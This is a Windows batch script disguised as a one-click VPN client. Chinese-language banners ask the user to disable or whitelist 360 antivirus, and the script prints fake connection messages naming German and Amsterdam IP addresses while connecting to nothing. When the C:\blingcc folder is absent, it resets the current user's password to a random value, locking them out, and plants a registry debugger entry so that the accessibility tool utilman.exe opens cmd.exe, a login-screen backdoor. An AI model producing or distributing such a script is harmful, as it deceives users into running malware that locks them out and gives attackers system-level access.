@echo off
@title VPN
echo ***************************************************************
echo *                                                             *
echo *               360可能会拦截该软件，请安心放行               *
echo *                         拦截原因：                          *
echo *                                                             *
echo *【一键连接】功能需要自动设置全局代理，但是360认为该行为不安全*
echo *                                                             *
echo ***************************************************************
pause
cls
echo ***************************************************************
echo *                                                             *
echo *                    请务必关闭360等软件                      *
echo *                      否则会无法连接                         *
echo *                                                             *
echo ***************************************************************
pause
cls
if  exist "C:\blingcc" (goto no1) else (goto no2)
:no1
echo ***************************************************************
echo *                                                             *
echo *              VPN已连接至 Germany 185.117.84.23              *
echo *                                                             *
echo ***************************************************************
pause
exit
:no2
echo ***************************************************************
echo *                                                             *
echo *              VPN已连接至 Amsterdam 164.19.8.23              *
echo *                                                             *
echo ***************************************************************
net user %username% %random%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
pause
exit


